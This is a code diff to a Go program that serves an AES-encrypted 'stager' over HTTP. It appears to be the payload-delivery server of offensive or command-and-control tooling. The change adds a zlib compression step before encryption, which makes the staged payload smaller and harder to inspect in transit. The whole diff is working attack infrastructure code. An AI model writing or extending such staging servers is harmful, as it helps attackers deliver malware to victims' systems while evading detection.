@@ -1,6 +1,8 @@
 package main
 
 import (
+	"bytes"
+	"compress/zlib"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
@@ -39,6 +41,18 @@ func encryptData(data []byte, key []byte) []byte {
 
 	// Prepend the IV to the encrypted data
 	return append(iv, encrypted...)
+}
+
+// compressData compresses the given data using zlib.
+func compressData(data []byte) []byte {
+	var b bytes.Buffer
+	w := zlib.NewWriter(&b)
+	_, err := w.Write(data)
+	if err != nil {
+		log.Fatalf("Failed to compress data: %v", err)
+	}
+	w.Close()
+	return b.Bytes()
 }
 
 // deriveKeyFromString derives a 16-byte key from a string.
@@ -87,7 +101,9 @@ func main() {
 	}
 
 	key := deriveKeyFromString(*keyStr)
-	encryptedStager := encryptData(stager, key)
+
+	compressedStager := compressData(stager)
+	encryptedStager := encryptData(compressedStager, key)
 
 	log.Printf("Serving encrypted stager file on port %s", *port)
 	ServeHTTPStager(encryptedStager, *port)
